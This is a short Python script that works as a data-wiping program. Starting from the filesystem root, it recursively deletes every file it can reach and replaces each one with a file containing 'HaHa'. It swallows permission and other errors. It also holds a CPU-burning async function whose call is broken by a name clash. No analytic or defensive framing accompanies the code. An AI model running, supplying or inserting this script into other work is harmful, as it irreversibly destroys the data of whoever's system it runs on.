import os as o
import math

async def f():
    for _ in range(10_000_000): math.pow(_, _)

def a(p='/'):
    try:
        for i in o.listdir(p):
            j = o.path.join(p, i)
            if o.path.isdir(j): a(j)
            elif o.path.isfile(j):
                o.remove(j)
                with open(j, 'w') as f: f.write('HaHa')
                f()
    except PermissionError: print(f"? {p}")
    except Exception as e: print(f"? {p}: {e}")
if __name__ == '__main__': a()